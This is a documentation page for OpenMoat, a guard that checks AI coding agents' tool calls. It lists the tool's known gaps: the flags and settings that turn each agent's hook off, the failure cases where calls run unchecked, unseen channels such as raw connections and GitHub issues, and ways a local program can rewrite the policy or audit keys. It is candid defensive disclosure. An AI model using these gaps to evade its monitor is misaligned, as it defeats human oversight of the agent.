# Limits

[README](../README.md) · [Docs index](README.md) · [openmoat.dev/docs](https://openmoat.dev/docs/)

> [!NOTE]
> **Read this when** you want to know what OpenMoat does not stop, before you rely on it.

**On this page:** [Approvals and prompts](#approvals-and-prompts) · [Sandboxes and allowed code](#sandboxes-and-allowed-code) · [What the hook does not see](#what-the-hook-does-not-see) · [When an agent skips or changes the check](#when-an-agent-skips-or-changes-the-check) · [Limits of single checks](#limits-of-single-checks) · [Snapshots and restore](#snapshots-and-restore)

OpenMoat checks the tool calls an agent's hook reports. It does not confine every call.
If its own check errors or hangs, OpenMoat blocks the call; the agents that still run a
call when the hook fails are listed under
[When an agent skips or changes the check](#when-an-agent-skips-or-changes-the-check).
Each agent's gaps and the reasons are in
[THREAT_MODEL.md §5](THREAT_MODEL.md#5-known-limitations).

## Approvals and prompts

- **A deferred call runs if your agent lets it.** In auto-approve modes
  (`--dangerously-skip-permissions`, Run Everything) only `deny` and `review` stop a call.
  `unattended: review` in your policy holds those calls for review where the hook can see
  the mode (Claude Code's `bypassPermissions` and `auto`, and `acceptEdits` for edits and
  file commands; pi without a screen, Hermes Agent in YOLO mode, Antigravity CLI's
  `always-proceed`; POLICY.md §5.4, ADR-102). It is off by default. In `auto` and
  `acceptEdits` the review is Claude Code's prompt, so it holds only while someone answers
  it; elsewhere it is a deny until you approve it. Cline's `--auto-approve`, OpenCode 2's `--auto`, Codex's approval policy
  `never`, Gemini CLI's `--yolo` and GitHub Copilot CLI's `--allow-all-tools` are not
  shown to the hook, so a deferred call still runs there; use `openmoat run`.
- **Some agents cannot prompt.** Codex, OpenCode 1, goose, the Cline CLI (where the deny
  also ends Cline's run), Cursor's file tools, pi in print and JSON mode, and Hermes Agent
  in YOLO mode receive a `review` as a deny that says how to approve the call
  (`openmoat`, or `openmoat allow --last`); GitHub Copilot CLI in autopilot turns it into
  a deny itself.
- **A remote approval after the hook's wait answers the next try, not the prompt.**
  With a channel connected ([APPROVALS.md](APPROVALS.md)) and `openmoat approvals
  listen` running, the hook waits up to 20 seconds (at most 25, less where the agent's
  hook time limit is shorter) for the answer; after that an agent that prompts shows its
  prompt, and an approval from the phone lets the same call run once when the agent
  tries it again before the request expires. Answers arrive only while `openmoat
  approvals listen` runs (in a terminal, or as the service `openmoat approvals install`
  writes on macOS and Linux), anyone who controls an approver's Telegram account can
  approve, and the redacted call is sent to Telegram.
- **OpenCode 2's `--auto` approves OpenMoat's reviews** as it approves OpenCode's own,
  and OpenMoat's plugin cannot tell. OpenCode before 1.3.4 is not supported:
  `openmoat init` does not set it up and `openmoat status` says to upgrade.
- **A rule given `--for` ends for the hook first.** The hook leaves it out from the moment
  its time is up. The agents' sandbox settings keep it until `openmoat allow --prune` or
  `openmoat sandbox sync` rewrites them (`openmoat doctor` shows them as out of date), and
  an `openmoat run` session or `openmoat proxy` started before the end keeps it until it
  stops. The end follows the machine's clock: moving the clock forward ends a rule early,
  moving it back makes it last longer by as much, and moving it back to before the rule
  was given ends it.
- **The gate's code proves a phone, not a person, and only where its secret stays
  hidden.** With `openmoat gate setup`, a command that loosens the policy also asks for
  a code from your authenticator app (ADR-117). The secret is a file in `~/.moat`,
  owner-only and denied to agents' own calls; a program running as you outside every
  hook and sandbox can read it, or delete it and turn the gate off. Lose the phone and
  you remove the file yourself (`~/.moat/audit.key.gate` and `~/.moat/gate.json`) and
  set it up again. Approving one held call is not a policy change and asks no code.

## Sandboxes and allowed code

- **Outside an OS sandbox, the hook decides alone.** For hook-only agents (OpenClaw,
  GitHub Copilot CLI, pi, Gemini CLI, OpenCode, Hermes Agent, the Cline CLI, goose, the
  Antigravity CLI, Qwen Code, Crush, and
  Claude Code and Cursor on native Windows), an allowed call runs with your permissions,
  so a classifier mistake is a bypass. `openmoat status` and `openmoat doctor` name the
  `openmoat run` command that puts each of them in an OS sandbox, or say why there is none
  (macOS before 13, Linux without bubblewrap; on Windows the command starts a preview tier
  that holds writes only, below; the Continue CLI has no command, nor has OpenClaw on
  Windows, [SANDBOX.md](SANDBOX.md#agents-openmoat-writes-no-sandbox-for)).
  The command is proved with a stand-in program, not the real agent. Confining stays
  your choice: `openmoat init` asks per agent and `openmoat confine` turns it on later;
  until then each such agent's row says `protection 0/100`. Claude Code's sandbox covers only `Bash`,
  `PowerShell` and `Monitor`; its file tools, `WebFetch` and MCP servers run outside it.
  Cursor runs some commands outside its sandbox.
- **OpenClaw under `openmoat run` confines the Gateway only (preview, ADR-108 §7).**
  `--listen` lets the sandbox serve one loopback port; nothing inside a sandbox can
  connect to it, so the sandboxed-start shim confines `openclaw gateway` and every other
  `openclaw` command (the Gateway's clients, `openclaw agent --local` included) starts
  with the hook only. The browser tool's own control port is not granted, so the browser
  tool does not start in the sandbox; a Gateway installed as a launchd or systemd service
  does not go through the shim. Linux without a network namespace and Windows refuse
  `--listen`.
- **`openmoat run` on Windows holds writes and the process tree only (preview, ADR-115).**
  A write-restricted token refuses writes outside the project, the run's temp directory
  and `--write` paths, and a job ends every process the agent started. Not covered:
  **reads** (the token is checked on writes only, so secrets, other agents' logins and
  OpenMoat's state are readable to commands and the hook alone decides them); **the
  network** (no Windows Filtering Platform filter: a program that ignores `HTTP_PROXY`
  connects directly); anything whose access list grants `Everyone` write; denied places
  inside the project below its top, matched by a glob, or made after the run started; the
  tool-shell wrapper (tool commands keep the relay token); batch files (`.cmd`/`.bat`,
  such as npm shims) are not started. The first run in a folder leaves an inherited
  access-list entry on it for a SID no account has, and keeps it; adding it to a large
  tree takes a while once. A Windows run scores at most 55/100, so
  `require.run: full-boundary` and `sandbox.strict: true` refuse there. No real agent has
  been run under it yet: the tests start `cmd.exe`
  ([SANDBOX.md](SANDBOX.md#openmoat-run-on-windows-preview-writes-only)).
- **`require.run: full-boundary` is about `openmoat run`.** It refuses a run without an OS
  sandbox or, on Linux, without the Isolated tier (ADR-080). An agent started without
  `openmoat run` is not refused
  ([POLICY.md §9.3](POLICY.md#93-requiring-openmoat-runs-full-boundary-requirerun)).
- **The protection score counts kernel features, not how well they hold.** It says which
  of the features `openmoat run` can use are in force, weighted to 100; a bug in one of
  them, or in OpenMoat's rules for it, does not lower it. It compares runs on one system,
  not systems, and the hook alone scores 0. `sandbox.strict: true` refuses any run below
  100, so on Linux before 7.2 (Landlock ABI 10) it refuses every run; it is read from your
  own policy only and, like `require.run`, says nothing about an agent started without
  `openmoat run` ([SANDBOX.md](SANDBOX.md#the-protection-score-and-strict-mode), ADR-108).
- **`openmoat run` scrubs the environment only when asked.** With `sandbox.env: scrubbed`,
  `--scrub-env` or `require.run: full-boundary`, only an allowlist of variables reaches the
  agent ([POLICY.md §9.6](POLICY.md#96-the-environment-openmoat-run-passes-on-sandboxenv),
  ADR-105). It is off by default for now, so otherwise every variable reaches the agent
  (a brokered secret's holds its placeholder) and one line warns. Scrubbed, an agent's
  own key stays on the list, so its commands can read that key; a value kept in a file or
  keychain is outside it; a tool that needs a variable no list names stops working until
  you add the name. An agent started without `openmoat run`, and its commands, get your
  whole environment: Claude Code's and Codex's own switches for this are not set by
  OpenMoat yet.
- **A required protection level is checked where the hook runs.** With `require:`
  ([POLICY.md §9.2](POLICY.md#92-required-protection-level-require)) the guard denies every
  call of an agent below the level, but it only sees what it can tell from inside one
  call without starting a process: that its hook runs, that the lock still pins the hook
  entries as `openmoat init` wrote them, whether the call came through `openmoat run`,
  and whether OpenMoat's sandbox settings for the agent are in place (the answer kept per
  lock). It cannot see a hook that does not run (turned off in the agent's settings, a
  plugin the agent did not load, an agent that runs a call when the hook fails): no call
  reaches it to deny. `openmoat status` and `openmoat doctor` show those agents as below
  the level, and `openmoat run` refuses them, but an agent started on its own keeps
  running. `hook-and-os-sandbox` means OpenMoat's sandbox settings are in force, not that
  every call is confined (Claude Code's file tools, `WebFetch` and MCP servers run
  outside its sandbox). The kept sandbox answer lives in `~/.moat`, so a program that runs
  as you outside any sandbox can change it, as it can change the policy.
- **Under `openmoat run`, the agent's own login is readable to the commands it runs.**
  Every OS sandbox denies the agents' login and key files (`agent-credentials`) to the
  commands an agent runs; Claude Code's, Codex's and Cursor's sandboxes confine only those
  commands, so the agent still signs in. `openmoat run` holds the agent itself, so it
  keeps that agent's own login readable, and code inside an allowed command can read it
  there; other agents' logins stay denied. An API-key login can go through the broker
  instead ([BROKER_LOGINS.md](BROKER_LOGINS.md)); an OAuth login cannot
  ([ADR-054](adr/ADR-054-agent-credentials-in-sandboxes.md)).
- **On Linux, an agent's own sandbox can fail every command where user namespaces are
  refused.** Claude Code's, Codex's and Cursor's sandboxes need to create user
  namespaces as the user, and Claude Code's needs `bwrap` and `socat` on `PATH`
  ([SANDBOX.md](SANDBOX.md#what-each-agents-sandbox-needs-on-linux)). Where Ubuntu's
  AppArmor restriction, `user.max_user_namespaces=0`, Debian's
  `kernel.unprivileged_userns_clone=0` or a container refuses them, Claude Code's
  commands fail, Codex's sandboxed commands do not start and Cursor asks before each
  command; the hook still decides each call. `openmoat doctor` and `openmoat status` say
  so and name the fixes, which are the machine's: no policy setting leaves one agent's
  sandbox off yet. Ubuntu's `bwrap-userns-restrict` AppArmor profile lets bubblewrap
  create its namespaces but takes every capability from what it starts, so Claude
  Code's seccomp step, which makes a user namespace inside bubblewrap's, fails under it
  whatever `kernel.apparmor_restrict_unprivileged_userns` says (GitHub's
  `ubuntu-latest` runner loads it, #784); the fix is the profile Claude Code's
  documentation gives in its place
  ([SANDBOX.md](SANDBOX.md#what-each-agents-sandbox-needs-on-linux)). The checks see
  that profile from the kernel's list where they may read it, else from
  `/etc/apparmor.d/`; one loaded by hand and not installed there is not seen, and
  they never create a nested namespace to test. Cursor's desktop app has an AppArmor profile of its own, which the check does
  not read, so with the restriction on and no `bwrap` installed it may warn for Cursor
  where Cursor's sandbox starts.
- **On Linux without bubblewrap, nothing can be created at the top of the project, and
  deeper denied paths stay open.** Landlock grants a folder with everything in it, so
  where `openmoat run` gets no network namespace (bubblewrap missing or blocked) it grants
  the project entry by entry (ADR-090): `.env` there is unreadable and `.git` and `.moat`
  read-only, but commands cannot create, rename or remove anything directly at the
  project's top (a new file, a `target/` that does not exist yet), and a `.env` or nested
  `.git` in a subfolder stays readable and writable; `openmoat run` names each such path
  when it starts and `openmoat doctor` warns. With bubblewrap, the Lightweight tier's
  network namespace covers the project as the Isolated tier does, and `git commit` inside
  the run fails there as under `--isolate` and on macOS. `openmoat run` starts the
  Isolated tier by default where bubblewrap works (ADR-080); the Lightweight tier runs with
  `--no-isolate` or where bubblewrap is missing or blocked, and then `openmoat run` says so
  when it starts, records it in the audit log and `openmoat doctor` warns. In every Linux
  tier, a `.env` created after the start where nothing stood (`.env.local`) stays readable
  to commands. The Isolated
  tier shows the agent only the project, the read roots and `--write` paths, so an agent
  whose runtime lives elsewhere in the home (a `node` under `~/.nvm`) can fail to start in
  it until that directory is in `sandbox.read_roots`; this was not tried with every agent.
  An agent's hook settings in the
  project (`.gemini/settings.json`, `.claude/settings.local.json`, …) are protected where
  the agent gets a network namespace, missing ones by a read-only `{}` placeholder for the
  session; without a namespace those at the top and in the folders holding them cannot be
  created, and one deeper that a command creates is named when the agent exits.
- **macOS's per-user caches stay readable under `openmoat run`.** Commands read and write
  only the run's own temp directory (`TMPDIR`); `/tmp` and macOS's temp folder
  (`/var/folders/…/T`) are not read roots there, nor the Kerberos ticket caches in them. On
  macOS `/var/folders/…/C` and `/var/folders/…/0` stay readable: system libraries and
  Apple's tools read them whatever `TMPDIR` says (compilers' module caches, the Launch
  Services database). They hold caches, not your files. Seatbelt also still lets commands
  read Claude Code's own `/tmp/claude-*`, which the default policy's `agent-temp` rule
  allows. A ticket cache that is no file
  is closed too: on Linux the seccomp filter refuses Unix sockets (`KCM:`, `sssd-kcm`) and
  the kernel keyring (`KEYRING:`), and on macOS the profile allows no ticket service.
  The host sandboxes (Claude Code's, Codex's, Cursor's) still read `/tmp` and
  `/var/folders`, as `sandbox.read_roots` lists them: they use those as their temp
  directory.
- **Allowed scripts and hosts.** An allowed `npm test` runs whatever it contains; the
  sandbox bounds it, OpenMoat does not inspect it. Without a sandbox, a script the
  session wrote needs review before an interpreter runs it, but a test runner, build tool
  or package script (`pytest`, `npm test`, `cargo test`, `make`) running files the session
  wrote does not, nor does a file another session wrote or one written by a program
  whose writes the hook cannot see (the files `tar x` or `unzip` extract, a build's or
  a package manager's output, what a script writes). An allowed host can receive data
  from an allowed command: the proxy checks the host, not what is sent inside HTTPS,
  unless a `requests:` entry it holds names the host and a proxy CA lets it read the
  request (POLICY.md §2.3). The hook reads request rules in the words of `curl`, `wget`,
  HTTPie, `xh`, `gh api` and `gh gist` (and a URL written in inline interpreter code),
  never in a script's own requests, nor in a raw connection a program opens itself
  (`openssl s_client`, `nc`), and no rule reads a request's body. Only GitHub's
  gist endpoints are listed by default, but an issue, a comment or a pull request on any
  public repository, sent with the same token, is as public a channel, and the rules do
  not cover it. On macOS, Go programs (`gh`) read the system keychain rather than
  `SSL_CERT_FILE`, so under the standalone `openmoat proxy` they do not trust the proxy
  CA, and their requests to a host the proxy holds fail closed; the default and the
  `exfil-endpoints` pack keep GitHub's rules in the hook for that reason.
- **A program that runs as you outside any sandbox** can change the policy and
  recompute the lock. Only the OS sandboxes stop that, so hook-only agents do not have
  this protection. The same goes for the audit log: such a program reads the audit key
  (`~/.moat/audit.key`) as easily as it writes the log, so it can rewrite both; the key
  stops only someone who can change the log but not read the key
  ([ADR-101](adr/ADR-101-keyed-audit-chain.md)). It reads the checkpoint signing key
  (`~/.moat/audit.key.ed25519`) too, and can sign checkpoints of a rewritten log; a
  checkpoint copied off the machine before that still shows the rewrite
  ([ADR-110](adr/ADR-110-signed-audit-checkpoints.md)). On Windows the key file is guarded by
  the state directory's access list, not by mode bits, as the other keys are.
- **The check and the call are two moments.** OpenMoat decides on what the call names;
  a file or link that changes between the check and the command running, and hard
  links that already exist, are not seen. Inside `openmoat run` the OS sandbox still
  holds ([THREAT_MODEL](THREAT_MODEL.md), ADR-009).
- **A `command` secret source trusts what the program reads** (preview, POLICY.md §2.2).
  The proxy checks that the agent cannot change the program file, the folders above it
  or a script's interpreter, and pins their digests, but not the files the program loads
  or reads (a script's modules, a program's libraries, its configuration): cover them
  with deny `fs.write` rules too, or use a program that is one file. The standalone
  `openmoat proxy` counts only the project of the folder it was started in as granted
  to the agent, not the write roots of an agent's own sandbox, so a deny rule inside one
  of those still counts there. A hook-only agent's writes
  through a program the hook cannot see are not stopped by those rules; only an OS
  sandbox stops them. On macOS and Linux everything left in the program's process group is
  ended with it; a child that started a session of its own (`setsid`) is not. On Windows
  only the program is ended, and a child it left holding its output keeps one waiting
  thread of the proxy until the child ends.
- **`openmoat guard` does not mask a `command` source's value in its audit rows**
  (preview, ADR-087 §6). Only the proxy has the value, and OpenMoat does not write it to
  a file for the guard to read. A tool call carries the value only if the agent already
  got hold of it; the proxy's own audit rows mask every value it gave. The same holds for
  a `mint` source (ADR-118).
- **A value handed to a `helper:` is readable by the session's commands** (preview,
  POLICY.md §2.2.1, ADR-118). git and the AWS tools are processes the agent starts, so
  any command it runs can start `openmoat credential` as they do and print the minted
  value. The proxy answers only the session's own processes and, for git, only for the
  secret's host, and records every answer (`proxy-helper`); what bounds the value is its
  narrowing (repositories and permissions, a session policy, scopes), its lifetime, and
  the hosts the agent may connect to. Inside a tunnel the proxy does not open, to a host
  the policy allows, a value sent there is not seen.
- **The agent's own login stays readable to its child commands** (ADR-054, ADR-118).
  `openmoat run` lets the agent read its own credential so that it can start; the
  commands it runs have the same rights, so they can read that login too. Minting narrows
  the credentials a session is handed, not the one the agent signs in with.
- **GitHub OAuth and personal access tokens cannot be narrowed** (ADR-118). GitHub has no
  call that makes a narrower token from one, such as the token `gh auth token` prints, so
  OpenMoat does not mint from it: a GitHub mint starts from a GitHub App.

## What the hook does not see

- **Tools no hook exposes are not seen**, such as Codex web search and hosted tools,
  and the shell commands you type yourself in OpenCode (`!`).
- **A repository's git configuration runs before any hook.** A `.git/config` that names a
  program (`core.fsmonitor`, a pager, a filter) runs when the editor's or the agent's own
  background git starts; `openmoat status` and `openmoat doctor` name such keys but
  cannot stop them. In the editors, the selection and open file Claude Code adds to a
  prompt are no tool call and are not checked ([IDE.md](IDE.md#not-covered)).
- **`require.run: full-boundary` reports an unprotected MCP server; it cannot stop one.**
  `openmoat status` and `openmoat doctor` show each server as protected or unprotected and
  count an unprotected local one against the setting, but the agent starts its own servers
  ([ADR-077](adr/ADR-077-enforced-run-boundary.md)).
- **Unwrapped MCP servers start before any call is checked.** The agent starts them
  itself, and no hook runs first; when differs per agent and most do not document it
  ([ADR-076](adr/ADR-076-hook-only-os-sandbox-and-mcp-startup.md)). For a server not
  wrapped (`openmoat init` offers to at a terminal; a project's own, one added later or
  one you declined), a changed or new server's tool calls are denied, but its command can
  already have run once, with your permissions. A wrapped server starts only from a
  definition you accepted, in `openmoat run`'s sandbox where it can sandbox; it does not
  start inside `openmoat run`, and `openmoat init` and `openmoat mcp wrap` cannot rewrite every
  agent's files: Hermes Agent's and goose's YAML, and an OpenCode file with comments, are
  named with what to set by hand; a goose extension of inline Python has no command to
  wrap. `openmoat status` lists the
  servers that start outside OpenMoat.
- **The MCP gateway covers local stdio servers only.** Remote (HTTP) MCP servers, plugin
  servers and managed MCP configuration are checked by the hook alone: their
  definitions are pinned, their calls decided, but nothing pins what they list, holds
  their tokens or checks where their OAuth discovery leads. A remote gateway is designed
  as future work in [ADR-114](adr/ADR-114-mcp-2026-07-28-and-package-provenance.md)
  (token custody, no token passthrough, SSRF-safe discovery) and not built.
- **A package release is read offline, from what the package manager left.** A wrapped
  or unwrapped stdio server's release is recorded when you accept it, from `npx`'s and
  `uv tool`'s own files and an image digest on the command line
  ([ADR-114](adr/ADR-114-mcp-2026-07-28-and-package-provenance.md)). A runner OpenMoat
  does not read (`bunx`, `pnpm dlx`, a global install, a `node` path), an image tag
  without a digest, or a cache that was cleared records nothing or only a tag, and a
  release the package manager installs as the server starts is seen on the next check,
  after that start.
- **MCP 2026-07-28 retries need their own hook decision.** A `tools/call` that answers a
  server's `input_required` result is a new call to the gateway; a host that does not
  run its hook for the retry gets it refused. Sampling through a wrapped server is
  refused unless the policy sets `mcp: { allow_sampling: true }`, and a URL-mode
  elicitation must name an `https` page on a host the policy does not deny; the default
  policy denies hosts it does not list, so a server's own sign-in page is refused until
  you allow its host (`openmoat allow --site <host>`). A tool whose
  schema refers to itself (`$ref` loops, a recursive tree type) or to another document is
  refused.
- **The hook sees an MCP call's arguments, not what the server then does.** A server
  started without `--sandbox` runs with your permissions: a tool that takes no path can
  still read any file you can and write anywhere, and neither the hook nor the gateway
  sees it. `openmoat mcp wrap` starts a server with `--sandbox` where `openmoat run` can
  sandbox (or `openmoat mcp proxy --sandbox` directly); there the operating system refuses
  what the policy's sandbox does not grant, whichever way the server names the file
  (relative path, absolute path, a symbolic link out of its folder), and a write outside
  the project. CI proves this by the files on disk, not by a verdict. A server you start
  with `--no-sandbox`, or where no sandbox is available, has none of this.
- **A browser goes where the page sends it.** A browser MCP call that only opens a page
  defers like `WebFetch`, and OpenMoat checks the URL it names, but not where the page's
  scripts, links and redirects lead next, nor where its name resolves. What the page says
  marks the session as untrusted, so writes to files that run later need review; installs
  and later pages do not.
- **`direnv exec` runs an `.envrc` OpenMoat does not read.** `direnv exec DIR cmd`
  loads the first `.envrc` (or, with `load_dotenv`, `.env`) found from `DIR` upwards,
  which can be above the project, and runs it with bash before `cmd`. The command and
  `DIR` are checked; the `.envrc`'s code and the variables it sets are not. direnv runs
  only an `.envrc` a person approved with `direnv allow` (by its content), and an agent's
  write of an `.envrc` or `.env` is denied (`secrets-paths`); `direnv allow` itself is
  left to the agent's own prompt, as any program no rule names.
- **rtk's subcommands are read from one release's command table.** `rtk` (Rust Token
  Killer) is read as its command table at commit `d0f0399a` (2026-11-19) says: its own
  file readers as reads, `env` as an environment dump, the ones that run a command as
  that command, and any other name as that program. A subcommand a later rtk adds is read
  as a program of that name until this list knows it. `rtk init` is not read as the
  write of an agent's hook file it makes; where OpenMoat pins that file, the lock then
  finds the change (`kernel-integrity`).

## When an agent skips or changes the check

- **Inside `openmoat run`, tool commands of some agents still receive the relay token.**
  Under Codex, Cursor, GitHub Copilot CLI, Gemini CLI, the Cline CLI and the Antigravity
  CLI, no way was found to tell tool commands from hooks, so a script or a test runner can send the run calls
  the agent never made. Under Claude Code, OpenCode, goose, Hermes Agent, OpenClaw, the
  Continue CLI and pi, tool commands do not receive it; MCP servers those agents start
  themselves may (`openmoat doctor` names the groups, ADR-075 has each agent's limits).
  Where the token is held, calls are decided by the policy as the agent's would be and
  recorded in the run's own sessions only (no other agent, no session from outside the
  run, no MCP ticket, no proxy credential). Read those rows as what was asked from inside
  the run (ADR-070, ADR-071, ADR-075).

- **Some agents run a call when the hook fails.** Claude Code before 2.1.295 runs a
  call unchecked if `openmoat` is missing. Codex, Gemini CLI, Qwen Code and Crush block
  it then, because OpenMoat's hook command exits 2 itself when the guard could not run
  or was killed (ADR-109). Codex also skips untrusted
  hooks: after `openmoat init`, open Codex, run `/hooks` and trust both OpenMoat hooks;
  `status` and `doctor` report missing trust and broken legacy entries. Codex, GitHub
  Copilot CLI, Gemini CLI, Qwen Code, Crush, the Cline CLI and (not documented) the
  Antigravity CLI run a call whose hook outlives its time limit. A slow guard never gets
  there: it answers deny on its own at its deadline, 30 s (25 s for Hermes Agent, whose
  plugin limit is 30 s), below every limit the agent was given (ADR-120), whatever the
  decision is stuck on, and records `hook-deadline`. What still runs such a call is a
  guard that cannot answer at all before the limit: its process stopped (a debugger,
  `kill -STOP`, a machine starved for minutes), or killed together with the hook command
  so no tail or plugin reports it. A guard the operating system kills alone (out of
  memory, `SIGKILL`) is a hook that crashed: the first column of the table below says
  what each agent does then. OpenClaw, pi and OpenCode run calls
  unchecked when they do not load OpenMoat's plugin or extension (OpenCode 1 with
  `--pure` or `OPENCODE_PURE`, OpenCode 2 with `-openmoat` in a project's `plugins`, or
  when the plugin fails to load, which each of them logs and goes on; `openmoat status`
  reports such a project). The plugin reports loading, and `openmoat status` says "plugin
  not loaded yet" until it has, and for pi "not protected" once pi ran without it. Hermes
  Agent's gateway, cron and ACP sessions skip the hook when its command is not approved in
  `shell-hooks-allowlist.json` (`openmoat init` approves it), as Hermes does under
  `HERMES_SAFE_MODE=1` or in a profile OpenMoat did not set up, and Hermes runs a call
  unchecked when its own hook dispatcher fails (a Hermes bug, not a failing hook). The
  Cline CLI runs a call when OpenMoat's hook script cannot start (native Windows), prints
  something that is not JSON or is killed after 120 s because the guard could not answer
  at all (a slow guard denies after 30 s), and under `--yolo`, which runs no
  hooks. goose runs calls unchecked when it does not load OpenMoat's plugin
  (`disabledPlugins`, `enabled: false` under `plugins` in `config.yaml`, or a project
  plugin named `openmoat`); `openmoat status` and `doctor` report both, for the directory
  they run in. The Antigravity CLI does not document what happens when a hook fails and
  has no documented setting that blocks then; the weekly real-agent check of 2026-11-12
  saw it block the call when OpenMoat's hook was missing or exited 1 without output, on
  Linux and macOS, but what it does when the hook cannot answer before its time limit or
  prints bad JSON is not known, so OpenMoat assumes the call runs then (a slow guard
  denies after 30 s, before the 600 s limit `openmoat init` writes); `--dangerously-skip-permissions`
  approves its requests unseen, which OpenMoat cannot see, and a `review` under a saved
  `toolPermission: always-proceed` is a deny.

### If the hook fails

What each agent does with a tool call when OpenMoat's hook fails in a way the hook
cannot catch itself (its binary is gone, it is killed, the host's time limit runs out),
or is turned off. The time limit is the one `openmoat init` installs, or OpenMoat's
plugin's own. The guard answers deny on its own at its deadline, below that limit
(ADR-120), so "times out" in the table is a guard that could not answer at all: a slow
one is denied. A guard the operating system kills (out of memory, `SIGKILL`) counts as
one that crashed. "Fails open" means the call runs unchecked in that case; `openmoat doctor`
names such an agent under its row with what to do: start it with `openmoat run`, whose OS
sandbox holds the boundary when the hook does not (`docs/SANDBOX.md`), and add
`require.run: full-boundary` to the policy so `openmoat run` refuses to start without it.
The weekly latest-agent job runs the real agents with the hook made to fail and fails
when an agent runs a call this table says it blocks (ADR-079). Generated from each host's
`HostSpec::hook_failure` (`OPENMOAT_TEST_UPDATE_DOCS=1 cargo test -p openmoat-hosts --test
docs`); do not edit the table. [PROTECTION.md](PROTECTION.md) puts these facts beside the
rest of each agent's protection on each OS, with the runs that back them.

When a hook is turned off, or an update stops running it, the agent says nothing and
neither does the hook. `openmoat status`, `openmoat doctor` and `openmoat watch` warn
when an agent wrote sessions since its hook, settings or program last changed and no
call of its reached OpenMoat ([USAGE.md](USAGE.md#does-the-agent-still-run-openmoats-hook),
ADR-104). For Claude Code, whose session start reaches OpenMoat, the warning comes at
once when a session that started called a tool OpenMoat's hook covers and none of its
calls arrived within 30 s of the transcript's last write (ADR-109); a resumed session
waits for the general check. The general warning has limits: it comes only after a session is ten minutes old; it
needs the agent's session files, which OpenMoat does not know for goose, Hermes Agent,
Antigravity CLI and Crush (a note there says no call came) nor for Cursor's editor or
the Cline VS Code extension; a session that used no tool looks the same as one whose calls went unchecked,
so the warning says "if they used tools"; sessions synced from another machine count
here though their calls were checked there; and it compares file times with the audit
log's on this machine, so a restored or wrongly dated file can raise it until the next
call.

<!-- generated:hosts-hook-failure -->
| Agent | Hook cannot start, crashes, is killed or exits non-zero | Hook times out | Time limit | Turned off (every call runs unchecked) | Fails open | Source |
|---|---|---|---|---|---|---|
| Claude Code | blocks the call from 2.1.295 (`openmoat init` asks for it); runs it before | blocks the call from 2.1.295 (`openmoat init` asks for it); runs it before | 600 s | `disableAllHooks: true` in a settings file (a project's included), `--settings '{"disableAllHooks": true}'`, or deleting the entry | before that version: cannot start, crashes or exits non-zero; times out | [1](https://code.claude.com/docs/en/hooks) |
| Codex | blocks the call | blocks the call: OpenMoat's guard answers deny at 30 s, before the agent's limit; runs it only when the guard cannot answer at all (stopped, or killed with the hook command) | 600 s | `[features] hooks = false` in `config.toml` (or `requirements.toml`), turning the hook off in `/hooks`, or a hook Codex has not been told to trust | no | [1](https://learn.chatgpt.com/docs/hooks) [2](https://github.com/openai/codex/blob/rust-v0.166.0/codex-rs/hooks/src/engine/command_runner.rs#L417) |
| Cursor | blocks the call | blocks the call | 600 s | deleting the entry from `hooks.json`, or an entry without `failClosed: true` (`openmoat status` calls that not protected) | no | [1](https://cursor.com/docs/agent/hooks) |
| OpenClaw | blocks the call | blocks the call | 45 s | a Gateway that does not load the plugin (disabled in `openclaw.json`, or a load error, which leaves the Gateway running) | no | [1](https://docs.openclaw.ai/plugins/hooks/reference) |
| GitHub Copilot CLI | blocks the call | blocks the call: OpenMoat's guard answers deny at 30 s, before the agent's limit; runs it only when the guard cannot answer at all (stopped, or killed with the hook command) | 600 s | `disableAllHooks: true` in a hook file or in a repository's `settings.json`, or deleting the hook file | no | [1](https://docs.github.com/en/copilot/reference/copilot-cli-reference/cli-hooks-reference) |
| pi | blocks the call | blocks the call | 45 s | `pi --no-extensions`, or an `extensions` entry in pi's or a trusted project's settings that turns the extension off | no | [1](https://github.com/earendil-works/pi/blob/main/packages/coding-agent/docs/extensions.md) |
| Gemini CLI | blocks the call | blocks the call: OpenMoat's guard answers deny at 30 s, before the agent's limit; runs it only when the guard cannot answer at all (stopped, or killed with the hook command) | 600 s | `hooks` turned off in the user's or a project's `settings.json`, or a folder Gemini CLI does not trust (which runs no settings hooks) | no | [1](https://geminicli.com/docs/hooks/reference/) [2](https://github.com/google-gemini/gemini-cli/blob/v0.65.0/packages/core/src/hooks/hookRunner.ts) |
| OpenCode | blocks the call | blocks the call | 45 s | OpenCode 1's `--pure` or `OPENCODE_PURE`, OpenCode 2's `-openmoat` in `plugins` (a project's included), or an error loading the plugin | no | [1](https://opencode.ai/docs/build/plugins/server) |
| Hermes Agent | blocks the call | blocks the call | 30 s | the hook missing from `config.yaml` or from `shell-hooks-allowlist.json` (gateway, cron and ACP sessions), another profile, or `HERMES_SAFE_MODE=1` | no | [1](https://github.com/NousResearch/hermes-agent/blob/v0.22.5/agent/shell_hooks.py) |
| Cline CLI | runs the call | blocks the call: OpenMoat's guard answers deny at 30 s, before the agent's limit; runs it only when the guard cannot answer at all (stopped, or killed with the hook command) | 120 s | `--yolo`, or `--config`, `--hooks-dir` or a moved `CLINE_DIR` OpenMoat did not install into | yes: cannot start, crashes or exits non-zero | [1](https://github.com/cline/cline/blob/cli-v3.0.74/sdk/packages/core/src/hooks/hook-file-hooks.ts) [2](https://github.com/cline/cline/blob/cli-v3.0.74/sdk/packages/core/src/hooks/subprocess-runner.ts) |
| goose | blocks the call | blocks the call | 60 s | `disabledPlugins` in a `settings.json`, `enabled: false` under `plugins` in `config.yaml`, a project plugin named `openmoat`, or a `hooks.json` goose cannot read | no | [1](https://github.com/aaif-goose/goose/blob/v1.57.0/crates/goose/src/hooks/mod.rs) |
| Antigravity CLI | blocks the call | blocks the call: OpenMoat's guard answers deny at 30 s, before the agent's limit; not documented, assumed to run it only when the guard cannot answer at all (stopped, or killed with the hook command) | 600 s | `enabled: false` on the entry (a project's `.agents/hooks.json` included), or deleting it | no | [1](https://antigravity.google/docs/hooks?tab=cli) [2](https://github.com/crocodile-labs/openmoat/actions/runs/43254846914) |
| Qwen Code | blocks the call | blocks the call: OpenMoat's guard answers deny at 30 s, before the agent's limit; runs it only when the guard cannot answer at all (stopped, or killed with the hook command) | 600 s | `disableAllHooks: true` in a settings file (whether a project's turns the person's hooks off was not verified, so OpenMoat assumes it does), `--safe-mode`, `--bare`, or deleting the entry | no | [1](https://qwenlm.github.io/qwen-code-docs/en/users/features/hooks/) [2](https://github.com/QwenLM/qwen-code/blob/main/packages/core/src/hooks/hookRunner.ts) [3](https://github.com/QwenLM/qwen-code/blob/main/packages/core/src/core/toolHookTriggers.ts) |
